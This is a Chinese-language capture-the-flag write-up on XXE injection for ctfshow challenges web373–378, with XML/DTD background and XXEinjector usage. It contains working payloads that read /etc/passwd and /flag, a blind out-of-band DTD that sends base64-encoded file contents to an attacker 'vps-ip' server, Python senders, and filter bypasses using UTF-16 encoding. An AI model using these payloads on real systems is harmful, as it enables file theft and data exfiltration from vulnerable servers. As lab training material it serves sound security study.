# ctfshow_xxe


## 总结

### xml基础

XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

### xml文档结构

```xml
<!--XML申明-->
<?xml version="1.0"?> 
<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

### DTD

文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可

被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD:

```xml
<!DOCTYPE 根元素 [元素声明]>
```

引用外部DTD:

```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

DTD文档中重要的关键字如下：

- DOCTYPE（DTD的声明）
- ENTITY（实体的声明）
- SYSTEM、PUBLIC（外部资源申请）

### 实体

实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。

实体按类型主要分为以下四种：

- 内置实体 (Built-in entities)
- 字符实体 (Character entities)
- 通用实体 (General entities)
- 参数实体 (Parameter entities)

实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。

完整的实体类别可参考 [DTD - Entities](https://www.tutorialspoint.com/dtd/dtd_entities.htm)

#### 实体类别

参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&实体名称。

参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。

内部实体：

```
<!ENTITY 实体名称 "实体的值">
```

外部实体:

```
<!ENTITY 实体名称 SYSTEM "URI">
```

参数实体：

```xml
<!ENTITY % 实体名称 "实体的值">
或者
<!ENTITY % 实体名称 SYSTEM "URI">
```

实例演示：除参数实体外实体+内部实体

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY name "bmjoker">]>
<foo>
        <value>&name;</value> 
</foo>
```

实例演示：参数实体+外部实体

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
]>
```

注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。

由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

#### 外部实体

外部实体即在DTD中使用

```
<!ENTITY 实体名称 SYSTEM "URI">
```

语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？

主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：

![image-20230928155343780](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230928155343780.png)

实例演示：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY content SYSTEM "file:///etc/passwd">]>
<foo>
        <value>&content;</value> 
</foo>
```

### xxe漏洞

XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，

没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、

发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

#### 漏洞检测

**首先**检测XML是否会被成功解析：

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY name "my name is nMask">]>    
<root>&name;</root>
```

若页面输出`my name is nMask`则说明xml可以被解析

**随后**检测服务器是否支持DTD引用外部实体

```xml
<?xml version=”1.0” encoding=”UTF-8”?>  
<!DOCTYPE ANY [  
<!ENTITY % name SYSTEM "http://localhost/index.html">  
%name;  
]>
```

可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。

#### 漏洞利用

##### 文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY name SYSTEM "file://c:\test.txt">]>
<root>&name;</root>
```

or（2023 moectf payload）

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///flag"> ]>
<xml><name>&b;</name></xml>
```

##### Blind XXE漏洞

针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据

在自己的vps服务器上创建test.php写入以下内容：

```php
<?php  
file_put_contents("test.txt", $_GET['file']) ;  
?>
```

在目标服务器上创建index.php写入以下内容：

```php
<?php  
$xml=<<<EOF  
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % file SYSTEM "file:///C:/test.txt">  
<!ENTITY % remote SYSTEM "http://localhost/test.xml">  
%remote;
%all;
%send;  
]>  
EOF;  
$data = simplexml_load_string($xml) ;  
echo "<pre>" ;  
print_r($data) ;  
?>
```

并创建test.xml并写入以下内容：

```xml
[html] view plain copy
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'>">
```

当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。

### XXEinjector

枚举HTTPS应用程序中的/etc目录：

```
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl
```

使用gopher（OOB方法）枚举/etc目录：

```
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
```

二次漏洞利用：

```
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt
```

使用HTTP带外方法和netdoc协议对文件进行爆破攻击：

```
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc
```

通过直接性漏洞利用方式进行资源枚举：

```
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
```

枚举未过滤的端口：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
```

窃取Windows哈希：

```
ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes
```

使用Java jar上传文件：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf
```

使用PHP expect执行系统指令：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls
```

测试XSLT注入：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt
```

记录请求信息：

```
ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt
```

## 靶场题目

### [web373]

有回显XXE，外部实体

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 13:36:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
```

payload：

```xml
<!DOCTYPE hacker[
    <!ENTITY hacker SYSTEM "file:///flag">
]> 
<root>
	<ctfshow>
	&hacker;
	</ctfshow>
</root>
```

### [web374]

无回显XXE ，外部实体。

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 13:36:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

无回显，考虑数据外带，访问一个请求，把数据加到请求上。

payload：

```xml
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % myurl SYSTEM "http://vps-ip/test.dtd">

    %myurl;
]> 
<root>
1
</root>
```

tips：

```xml
<!-- 要引用（dtd里面），所以要加百分号% -->
<!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 -->
<!-- 不能直接<!ENTITY  % myurl SYSTEM "http://vps-ip:port/%file"> ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制-->
<!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&#x25; vps），那就会解析（&#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。
也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。
总结就是，%myurl 这种引用会自动向地址发送请求。 -->
```

test.dtd（放vps上面）内容

```xml
<!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://vps-ip:port/%file;'> ">
<!-- &#x25; 就是百分号（&#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 -->
<!-- 如果选择nc监听的话，端口一定要加！！！ -->
<!-- 如果选择看日志的话，端口一定不能加！！！ -->

<!-- 引用（执行）dtd实体，vps被注册 -->
%dtd;
<!-- 引用（执行）vps实体，接收%file变量的内容 -->
%vps;
```

![image-20230928162355933](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230928162355933.png)

然后base64解码即可得到flag

也可以通过python脚本发包：

```python
import requests

url = ''
payload = """<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://vps-ip/text.dtd">
%aaa;
]>
<root>123</root>"""
payload = payload.encode('utf-8')
requests.post(url ,data=payload)
```

### [web375]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 15:22:05
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);
```

加了个正则匹配，可以不写XML声明绕过，也可以多敲一个空格绕过

### [web376]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 15:23:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

相比web375，本题多了"/i"，不区分大小写，当然我们也可以通过不写XML声明绕过，也可以打一个空格在`?xml`和`version`之间绕过，也可以将`<\?xml version="1\.0"`中的双引号换成单引号绕过

### [web377]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 15:26:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);
```

比之前几题多过滤了一个`http`

可以采用编码绕过，用脚本把web374的payload转为`utf-16`编码。

一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。

```python
import requests

url = 'http://a83196d0-7399-4a44-9601-23509c34a124.challenge.ctf.show/'

#注意这里是单引号，为了绕过过滤
payload = """<?xml version='1.0' encoding="UTF-8"?>
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % myurl SYSTEM "http://vps-ip/test.dtd">

    %myurl;
]> 

<root>
1
</root>
"""
payload = payload.encode('utf-16')
print(requests.post(url ,data=payload).text)
```

### [web378]

开题可见
![image-20230928221017789](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230928221017789.png)

抓包看一下，xxe无疑了
![image-20230928221050289](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230928221050289.png)

部分源码：

```php
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```

payload:

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>

<user><username>&xxe;</username><password>&xxe;</password></user>
```

![image-20230928221239565](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230928221239565.png)

